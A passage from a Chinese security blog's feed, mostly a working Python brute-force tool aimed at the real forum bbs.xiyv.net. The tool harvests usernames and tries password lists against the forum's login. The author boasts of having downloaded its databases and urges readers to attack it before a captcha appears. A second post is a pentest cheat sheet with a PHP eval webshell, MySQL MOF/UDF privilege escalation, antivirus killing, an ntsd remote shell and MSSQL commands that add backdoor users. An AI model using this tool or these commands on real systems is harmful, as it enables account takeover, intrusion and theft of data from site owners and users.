class="params">(self,uidqueue,useragent,usernamefile,lock)</span>:</span></div><div class="line">        Thread.__init__(self)</div><div class="line">        self.uidqueue = uidqueue</div><div class="line">        self.usernamefile = usernamefile</div><div class="line">        self.lock = lock</div><div class="line">        self.useragent = useragent</div><div class="line">        self.goodnumber = <span class="number">0</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        self.headers = {</div><div class="line">            <span class="string">'Origin'</span>:<span class="string">'http://bbs.xiyv.net/'</span>,</div><div class="line">            <span class="string">'User-Agent'</span>:self.useragent,</div><div class="line">            <span class="string">'Referer'</span>:<span class="string">'http://bbs.xiyv.net/'</span></div><div class="line">        }</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">if</span> self.uidqueue.empty():</div><div class="line">                <span class="keyword">break</span></div><div class="line">            url = <span class="string">"http://bbs.xiyv.net/?you-index-uid-%s.htm"</span> % self.uidqueue.get()</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                returnreq = get(url,headers=self.headers)</div><div class="line">            <span class="keyword">except</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'[x] 网络异常'</span></div><div class="line">            <span class="keyword">if</span> returnreq.status_code == <span class="number">403</span>:</div><div class="line">                self.lock.acquire()</div><div class="line">                <span class="keyword">print</span> <span class="string">'[x] 频率过高,论坛有狗,已被拦截,暂停中..xxxx'</span></div><div class="line">                self.lock.release()</div><div class="line">                exit(<span class="number">0</span>)</div><div class="line">            <span class="keyword">elif</span> returnreq.status_code == <span class="number">200</span>:</div><div class="line">                soup = BeautifulSoup(returnreq.text)</div><div class="line">                returnsoup = soup.find(<span class="string">"div"</span>,<span class="string">"header"</span>)</div><div class="line">                <span class="keyword">if</span> returnsoup != <span class="keyword">None</span>:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        self.lock.acquire()</div><div class="line">                        self.usernamefile.write(returnsoup.text.encode(<span class="string">'utf-8'</span>) + linesep)</div><div class="line">                        self.lock.release()</div><div class="line">                        <span class="keyword">print</span> <span class="string">'[v] %s'</span> % returnsoup.text</div><div class="line">                    <span class="keyword">except</span>:</div><div class="line">                        self.lock.acquire()</div><div class="line">                        <span class="keyword">print</span> <span class="string">'[x] 文件写入错误'</span></div><div class="line">                        self.lock.release()</div><div class="line">                        exit(<span class="number">0</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                self.lock.acquire()</div><div class="line">                <span class="keyword">print</span> <span class="string">'[x] 错误,错误原因:不正常的返回状态码'</span></div><div class="line">                self.lock.release()</div><div class="line">                exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">crack_password</span><span class="params">(Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,username_queue,password_list,lock,result_file,useragent)</span>:</span></div><div class="line">        Thread.__init__(self)</div><div class="line">        self.username_queue = username_queue</div><div class="line">        self.password_list = password_list</div><div class="line">        self.lock = lock</div><div class="line">        self.result_file = result_file</div><div class="line">        self.useragent = useragent</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        self.headers = {</div><div class="line">            <span class="string">'Origin'</span>:<span class="string">'http://bbs.xiyv.net/'</span>,</div><div class="line">            <span class="string">'User-Agent'</span>:self.useragent,</div><div class="line">            <span class="string">'Referer'</span>:<span class="string">'http://bbs.xiyv.net/'</span></div><div class="line">        }</div><div class="line">        self.loginInfo = {</div><div class="line">            <span class="string">'FORM_HASH'</span> : self.getHash(self.headers),</div><div class="line">            <span class="string">'clienttime'</span> : int(time()),</div><div class="line">        }</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">if</span> self.username_queue.empty():</div><div class="line">                <span class="keyword">break</span></div><div class="line">            self.loginInfo[<span class="string">'email'</span>] = self.username_queue.get()</div><div class="line">            self.lock.acquire()</div><div class="line">            <span class="keyword">print</span> <span class="string">'[!] 尝试用户名:%s'</span> % self.loginInfo[<span class="string">'email'</span>]</div><div class="line">            self.lock.release()</div><div class="line">            <span class="keyword">for</span> password <span class="keyword">in</span> self.password_list:</div><div class="line">                self.loginInfo[<span class="string">'password'</span>] = password.replace(linesep,<span class="string">''</span>)</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    reqLoginResult = post(<span class="string">"http://bbs.xiyv.net/?user-login-ajax-1.htm"</span>,data=self.loginInfo)</div><div class="line">                <span class="keyword">except</span>:</div><div class="line">                    <span class="keyword">print</span> <span class="string">'[x] 网络异常'</span></div><div class="line">                    <span class="keyword">continue</span></div><div class="line">                <span class="keyword">if</span> reqLoginResult.status_code == <span class="number">403</span>:</div><div class="line">                    self.lock.acquire()</div><div class="line">                    <span class="keyword">print</span> <span class="string">'[x] 频率过高,论坛有狗,已被拦截,暂停中..xxxx'</span></div><div class="line">                    self.lock.release()</div><div class="line">                    exit(<span class="number">0</span>)</div><div class="line">                <span class="keyword">if</span> <span class="string">"auth"</span> <span class="keyword">in</span> reqLoginResult.text:</div><div class="line">                    <span class="keyword">print</span> <span class="string">'[v] 成功,账号:%s 密码:%s,已写入文件:result.txt'</span> % (self.loginInfo[<span class="string">'email'</span>],self.loginInfo[<span class="string">'password'</span>])</div><div class="line">                    self.writeResult(self.result_file,<span class="string">'账号:%s 密码%s'</span> % (self.loginInfo[<span class="string">'email'</span>],self.loginInfo[<span class="string">'password'</span>]))</div><div class="line">                    <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getHash</span><span class="params">(self,headers)</span>:</span></div><div class="line">        <span class="string">'''</span></div><div class="line">        获取西域论坛登陆时的随机hash</div><div class="line">        '''</div><div class="line">        req_html = get(<span class="string">"http://bbs.xiyv.net/?user-login-ajax-1-ajax-1.htm"</span>,headers=headers).text</div><div class="line">        reResult = findall(<span class="string">"value=(.*)"</span>,req_html)</div><div class="line">        <span class="keyword">return</span>  reResult[<span class="number">0</span>].split(<span class="string">'\\'</span>)[<span class="number">1</span>].replace(<span class="string">'"'</span>,<span class="string">''</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writeResult</span><span class="params">(self,result_file,content)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            self.lock.acquire()</div><div class="line">            self.result_file.write(content + linesep)</div><div class="line">            self.lock.release()</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[x] 文件写入错误'</span></div><div class="line">            exit(<span class="number">0</span>)</div></pre></td></tr></table></figure>

<hr>
<p>其实上个月就写出来了,现在把想要的数据库都下载完了,放出来吧,线程控制一直做的很差,不过距离上个月,已经比较掌握了<code>gevent</code>的使用了…但没准备改写这,估计很快西域论坛就会加上验证码了,大家有想下的裤快去爆破来下载吧<br>打包下载地址:<a href="https://dn-sqzr.qbox.me/xiyu-brute-force-attack.zip" target="_blank" rel="external">xiyu-brute-force-attack.zip</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>好象很多社工库都关闭了,要不抽风,要不收费,要不打不开!!蛋疼,有时候实在想查数据,没地方查。还是自己收集点数据在本地用软件来检索方便。在纠结哪里收集点数据的时候,目测到了一个论坛<a href="http://bbs.xiyv.net" target="_blank" rel="external">西域论坛</a>。一看列表,发现数据还不少,但是很大部分都需要金币,发裤子可以得金币,坑爹,我等小菜哪有什么私藏的裤子啊,哈哈。发现这论坛登陆没验证码,自己写个脚本爆破吧.<br><code>脚本写的非常烂,不考虑性能(其实有用多线程,但线程控制写的很烂,加上论坛有安全狗,只有放慢速度),实际还是可用的</code><br>]]>
    
    </summary>
    
      <category term="神器" scheme="https://sqzr.cc/tags/%E7%A5%9E%E5%99%A8/"/>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[渗透中常用的命令(备忘)]]></title>
    <link href="https://sqzr.cc//blog/2014/03/02/shen-tou-zhong-chang-yong-de-ming-ling-bei-wang/"/>
    <id>https://sqzr.cc//blog/2014/03/02/shen-tou-zhong-chang-yong-de-ming-ling-bei-wang/</id>
    <published>2014-03-02T06:25:00.000Z</published>
    <updated>2014-10-30T13:03:59.000Z</updated>
    <content type="html"><![CDATA[<p>文章中并没有提起任何新技术(或者说是未公开的小窍门),都是些已经<code>烂大街</code>的命令了,不过很多命令比较长,也比较实用，以前博客有一篇日志有记录,忘迁移过来就被删除了。在evernote里找到一份备份,就迁移过来吧  </p>
<ul>
<li>2014-3-2 添加mysql windows mssql中常用的命令  </li>
<li>2014-3-29 添加两种查看windows是否开启远程桌面办法  </li>
<li>2014-4-26 添加让win自带的防火墙允许端口进出  </li>
<li>2014-5-5  添加查看占用的命令(windows)  </li>
</ul>
<hr>
<h2 id="mysql中常用命令">mysql中常用命令</h2>
<p>开启mysql外链:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'root密码'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span></div></pre></td></tr></table></figure>

<p>mysql root权限写文件:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">table</span> test (a <span class="built_in">text</span>);</span></div><div class="line"><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> test (a) <span class="keyword">values</span> (&lt;?php eval($_POST[<span class="string">'password'</span>])?&gt;);</span></div><div class="line"><span class="operator"><span class="keyword">select</span> a <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">into</span> <span class="keyword">outfile</span> ‘e://appserv//www//xoops//modules//wordpress//app.php’;</span></div></pre></td></tr></table></figure>

<p>当下载mysql的user.MYD数据库连接密码hash值无法用winhex等十六进制编辑器查看时:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">将下载的user.MYD user.frm user.MYI替换本地文件，然后</div><div class="line">mysqld-nt –skip-<span class="operator"><span class="keyword">grant</span>-<span class="keyword">tables</span>(mysql目录下的<span class="keyword">bin</span>目录下)</span></div><div class="line">重新打开一个cmd</div><div class="line">mysql -u root</div><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span>;</div></pre></td></tr></table></figure>

<p><a id="more"></a><br>mysql mof提权(windows 会自动执行指定目录下的mof文件):<br>将下面文件存在<code>任意位置</code> </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#pragma namespace("\\\\.\\root\\subscription")</span></div><div class="line"></div><div class="line">instance <span class="keyword">of</span> __EventFilter <span class="keyword">as</span> $<span class="type">EventFilter</span></div><div class="line">{</div><div class="line">    <span class="type">EventNamespace</span> = <span class="string">"Root\\Cimv2"</span>;</div><div class="line">    <span class="type">Name</span>  = <span class="string">"filtP2"</span>;</div><div class="line">    <span class="type">Query</span> = <span class="string">"Select * From __InstanceModificationEvent "</span></div><div class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></div><div class="line">            <span class="string">"And TargetInstance.Second = 5"</span>;</div><div class="line">    <span class="type">QueryLanguage</span> = <span class="string">"WQL"</span>;</div><div class="line">};</div><div class="line"></div><div class="line">instance <span class="keyword">of</span> <span class="type">ActiveScriptEventConsumer</span> <span class="keyword">as</span> $<span class="type">Consumer</span></div><div class="line">{</div><div class="line">    <span class="type">Name</span> = <span class="string">"consPCSV2"</span>;</div><div class="line">    <span class="type">ScriptingEngine</span> = <span class="string">"JScript"</span>;</div><div class="line">    <span class="type">ScriptText</span> =</div><div class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user ftp test /add\")"</span>;</div><div class="line">};</div><div class="line"></div><div class="line">instance <span class="keyword">of</span> __FilterToConsumerBinding</div><div class="line">{</div><div class="line">    <span class="type">Consumer</span>   = $<span class="type">Consumer</span>;</div><div class="line">    <span class="type">Filter</span> = $<span class="type">EventFilter</span>;</div><div class="line">};</div></pre></td></tr></table></figure>

<p>使用mysql的into dumpfile函数把文件导出到<code>c:/windows/system32/wbem/mof/</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'C:\WINDOWS\temp\1.mof'</span>) <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'c:/windows/system32/wbem/mof/1.mof'</span>;</span></div></pre></td></tr></table></figure>

<p>mysql udf提权(mysql 可以创建自定义函数):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> udf_temp (udf <span class="built_in">BLOB</span>);</span></div><div class="line"><span class="comment">/* 这是创建临时表，为了将udf.dll的代码写入数据库 */</span></div><div class="line"><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">into</span> udf_temp <span class="keyword">values</span> (<span class="keyword">CONVERT</span>(<span class="number">0x4D</span>......,<span class="built_in">CHAR</span>));</span></div><div class="line"><span class="comment">/* 非常长,最后会以文件的形式提供下载(1) */</span></div><div class="line"><span class="operator"><span class="keyword">SELECT</span> udf <span class="keyword">FROM</span> udf_temp <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'c:\\\\windows\\\\system32\\\\mysqlDll.dll'</span>;</span></div><div class="line"><span class="comment">/* 将写入数据库的udf.dll写入硬盘，路径为c:\windows\system32\cmd.exe，注意这里的斜线,不同的mysql版本可能会有不同,所以如果是php的程序,建议用对应的马,会自动读取版本判断位置,下载地址在mysql末尾(2) */</span></div><div class="line"><span class="operator"><span class="keyword">Create</span> <span class="keyword">Function</span> yoco <span class="keyword">returns</span> <span class="keyword">string</span> <span class="keyword">soname</span> <span class="string">'mysqlDll.dll'</span></span></div><div class="line"><span class="comment">/* 创建自定义函数，名称为yoco，这是最后一步，如果这三步都没问题，你就成功了 */</span></div><div class="line"><span class="keyword">select</span> yoco(<span class="string">'cmd命令'</span>);</div><div class="line"><span class="comment">/* 这是执行cmd的格式 */</span></div></pre></td></tr></table></figure>

<hr>
<h3 id="文章中提到的文件下载地址">文章中提到的文件下载地址</h3>
<ol>
<li><a href="http://letitbe.u.qiniudn.com/udf.sql" target="_blank" rel="external">udf.sql</a>  </li>
<li><a href="http://letitbe.u.qiniudn.com/final.php" target="_blank" rel="external">final.php</a>  </li>
<li>另外附一个udf使用windows api添加用户脚本(添加的用户名以及密码都为:msxtest):<a href="http://letitbe.u.qiniudn.com/msx.php" target="_blank" rel="external">msx.php</a>  </li>
</ol>
<hr>
<h2 id="windows中常用命令">windows中常用命令</h2>
<p>读取远程连接端口(16进制):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server<span class="command">\WinStations</span><span class="command">\RDP</span>-Tcp /v PortNumber</div></pre></td></tr></table></figure>

<p>通过netstat判断远程连接端口(也适用于查看某端口是哪个软件占用):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">tasklist</span> /svc <span class="comment"># 找到svchost.exe 服务中有TermService关键字样的,记住pid</span></div><div class="line">netstat -ano <span class="comment"># 加上参数o会输出对应的pid,查找上面找到的pid</span></div></pre></td></tr></table></figure>

<p>开启远程连接服务(默认端口3389):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG ADD HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure>

<p>强制kill进程(在windows2003中能强制结束360,新版的安全狗无法结束了,但可以用killsafedog.exe(1)下载地址在末):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">taskkill /<span class="keyword">im</span> <span class="number">360</span>tray.<span class="keyword">exe</span> /<span class="keyword">f</span></div></pre></td></tr></table></figure>

<p>另一种kill进程的方式(感觉比以上的强,利用windows自带工具<code>ntsd</code>,办法来自<a href="http://www.freebuf.com" target="_blank" rel="external">freebuf</a>某文章的评论):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntsd -<span class="built_in">c</span> q -p pid</div></pre></td></tr></table></figure>

<p>利用ntsd进行端口转发(如果能上传以及执行lcx请尽量用lcx):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器上执行:</div><div class="line">ntsd -server tcp:<span class="variable">port=</span><span class="number">7777</span> cmd.exe <span class="comment"># 这里的cmd.exe只是获得一个宿主进程，当然mstsc.exe 、 calc.exe等等都是可以的</span></div><div class="line">本机上执行:</div><div class="line">ntsd -remote tcp:<span class="variable">server=</span>服务器ip,<span class="variable">port=</span><span class="number">7777</span> <span class="comment"># 运行后会弹出一个窗口，我们输入.shell即可成功获得cmdshell</span></div></pre></td></tr></table></figure>

<p>查看远程桌面有没有开启：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="title">net</span> start | find <span class="string">"Remote Desktop Services"</span>         <span class="comment">#win7、win2008</span></div><div class="line">net start | find <span class="string">"Terminal Services "</span>                     <span class="comment">#win xp、win2003</span></div></pre></td></tr></table></figure>

<p>或是:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">REG query HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\Terminal</span>" "Server /v fDenyTSConnections</div></pre></td></tr></table></figure>

<p>如是0×0，则可以连接，考虑是否有tcp过滤或者防火墙了；如果没有打开为0×1。<br>让win自带的防火墙允许某个端口进出:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh firewall <span class="keyword">set</span> portopening TCP <span class="number">1234</span> ENABLE</div></pre></td></tr></table></figure>

<p>netstat 查看占用端口:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -b <span class="comment">// b参数可以列出占用端口的进程名</span></div></pre></td></tr></table></figure>

<hr>
<h3 id="文章中提到的文件下载地址-1">文章中提到的文件下载地址</h3>
<p>1、 <a href="http://letitbe.u.qiniudn.com/KillSafeDog.exe" target="_blank" rel="external">killsafedog.exe</a></p>
<hr>
<h2 id="mssql中常用命令">mssql中常用命令</h2>
<p>xp_cmdshell执行命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">EXEC</span> master..xp_cmdshell <span class="string">'set'</span>;</div></pre></td></tr></table></figure>

<p>修复xp_cmdshell储存过程:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">Exec</span> <span class="tag">sp_addextendedproc</span> <span class="tag">xp_cmdshell</span> ,<span class="at_rule">@<span class="keyword">dllname</span> =<span class="string">'xplog70.dll'</span></span>;</div></pre></td></tr></table></figure>

<p>利用SP_OAcreate和SP_OAMETHOD执行命令(在wscript.shell组件存在的情况下以及xp_cmdshell和xplog70.dll都被删除的情况下):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="title">DECLARE</span> <span class="variable">@shell</span> INT; <span class="comment"># 建立一个@shell实体</span></div><div class="line"><span class="title">EXEC</span> SP_OAcreate <span class="string">'wscript.shell'</span>,<span class="variable">@shell</span> out; <span class="comment"># 创建OLE对象的实例</span></div><div class="line"><span class="title">EXEC</span> SP_OAMETHOD <span class="variable">@shell</span>,<span class="string">'run'</span>,null,<span class="string">'net user rfire 123456 /add'</span>; <span class="comment"># 调用@shell这个实例</span></div></pre></td></tr></table></figure>

<p>利用SQL代理执行命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="title">EXEC</span> master.dbo.xp_servicecontrol <span class="string">'start'</span>,<span class="string">'SQLSERVERAGENT'</span>; <span class="comment"># 使用xp_servicecontrol启动SQLSERVERAGENT服务</span></div></pre></td></tr></table></figure>

<p>利用注册表项执行命令(用xp_regwrite将执行命令写入启动项):</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EXEC master.dbo.xp_regwrite 'SOFTWARE<span class="command">\Microsoft</span><span class="command">\Windows</span><span class="command">\CurrentVersion</span><span class="command">\Run</span><span class="command">\'</span>,'shell'.'REG_SZ','C:<span class="command">\windows</span><span class="command">\system</span>32<span class="command">\cmd</span>.exe /c net user rfire 123456 /add';</div></pre></td></tr></table></figure>

<p>利用沙盒模式执行命令:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 先利用xp_regwrite（前提是要求xp_regwrite存在）改注册表，然后用OpenRowSet访问系统自身mdb文件，然后执行SQL语句。</span></div><div class="line"><span class="title">EXEC</span> master.dbo.xp_regwrite <span class="string">'HKEY_LOCAL_MACHINE'</span>,<span class="string">'SoftWare\Microsoft\Jet\4.0\Engine'</span>,<span class="string">'SandBoxMode'</span>,<span class="string">'REG_DWORD'</span>,<span class="number">0</span>; <span class="comment"># 开启沙盒模式</span></div><div class="line"><span class="title">Select</span> * From OpenRowSet(<span class="string">'Microsoft.Jet.OLEDB.4.0'</span>,<span class="string">';Database=c:\windows\system32\ias\ias.mdb'</span>,<span class="string">'select shell("net user rfire 123456 /add")'</span>); <span class="comment"># 执行命令</span></div></pre></td></tr></table></figure>

<p>mssql导出一句话:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">table</span> pcguest(pc <span class="built_in">char</span>(<span class="number">255</span>));</span><span class="comment">-- # 建一个表用作插入一句话木马</span></div><div class="line"><span class="operator"><span class="keyword">execute</span> sp_makewebtask @outputfile=<span class="string">'E:\Inetpub\wwwroot\PC.ASP'</span>,@<span class="keyword">query</span>=<span class="string">'select pc from pcguest'</span>;</span><span class="comment">--  # 导出一个asp文件</span></div></pre></td></tr></table></figure>

<p>mssql列目录:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> pctest(subdirectory <span class="built_in">VARCHAR</span>(<span class="number">100</span>),depth <span class="built_in">VARCHAR</span>(<span class="number">100</span>),[file] <span class="built_in">VARCHAR</span>(<span class="number">100</span>));</span> # 建一个新表存放列目录数据</div><div class="line"><span class="operator"><span class="keyword">Insert</span> pctest <span class="keyword">exec</span> <span class="keyword">master</span>..xp_dirtree <span class="string">"d:\app\",1,1; # 用xp_dirtree列目录结果导入所建成的表</span></span></div></pre></td></tr></table></figure>

<p>查看mssql版本信息:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> @@<span class="keyword">VERSION</span>;</span></div></pre></td></tr></table></figure>

<p>查看是否sa权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="string">'sysadmin'</span>);</span></div></pre></td></tr></table></figure>

<p>查看是否db_owner权限:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> IS_MEMBER(<span class="string">'db_owner'</span>);</span></div></pre></td></tr></table></figure>

<hr>
<p>欢迎大家补充,在渗透中还会用到很多繁琐的命令,很多长而实用的命令记录下来是非常不错的,虽说以上命令都不是我的原创,但希望转载能加个<code>出处</code></p>
<hr>
<h2 id="参考">参考</h2>
<ul>
<li><a href="http://www.91ri.org/8075.html" target="_blank" rel="external">【渗透笔记】捌 - 网络安全攻防研究室</a>  </li>
<li><a href="http://www.91ri.org/8524.html" target="_blank" rel="external">【渗透笔记】陆 - 网络安全功放研究室</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>文章中并没有提起任何新技术(或者说是未公开的小窍门),都是些已经<code>烂大街</code>的命令了,不过很多命令比较长,也比较实用，以前博客有一篇日志有记录,忘迁移过来就被删除了。在evernote里找到一份备份,就迁移过来吧  </p>
<ul>
<li>2014-3-2 添加mysql windows mssql中常用的命令  </li>
<li>2014-3-29 添加两种查看windows是否开启远程桌面办法  </li>
<li>2014-4-26 添加让win自带的防火墙允许端口进出  </li>
<li>2014-5-5  添加查看占用的命令(windows)  </li>
</ul>
<hr>
<h2 id="mysql中常用命令">mysql中常用命令</h2>
<p>开启mysql外链:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'root密码'</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span></div></pre></td></tr></table></figure>

<p>mysql root权限写文件:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">table</span> test (a <span class="built_in">text</span>);</span></div><div class="line"><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> test (a) <span class="keyword">values</span> (&lt;?php eval($_POST[<span class="string">'password'</span>])?&gt;);</span></div><div class="line"><span class="operator"><span class="keyword">select</span> a <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">into</span> <span class="keyword">outfile</span> ‘e://appserv//www//xoops//modules//wordpress//app.php’;</span></div></pre></td></tr></table></figure>

<p>当下载mysql的user.MYD数据库连接密码hash值无法用winhex等十六进制编辑器查看时:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">将下载的user.MYD user.frm user.MYI替换本地文件，然后</div><div class="line">mysqld-nt –skip-<span class="operator"><span class="keyword">grant</span>-<span class="keyword">tables</span>(mysql目录下的<span class="keyword">bin</span>目录下)</span></div><div class="line">重新打开一个cmd</div><div class="line">mysql -u root</div><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span>;</div></pre></td></tr></table></figure>

<p>]]>
    
    </summary>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在Mac os x下安装MySQL-python]]></title>
    <link href="https://sqzr.cc//blog/2014/01/14/zai-mac-os-xxia-an-zhuang-mysql-python/"/>
    <id>https://sqzr.cc//blog/2014/01/14/zai-mac-os-xxia-an-zhuang-mysql-python/</id>
    <published>2014-01-13T16:39:00.000Z</published>
    <updated>2014-10-30T13:37:07.000Z</updated>
    <content type="html"><![CDATA[<p>MySQLdb是<code>Python</code>连接MySQL的模块,在安装过程中,遇到了点小麻烦,特地记录了下来…  </p>
<h3 id="安装过程">安装过程</h3>
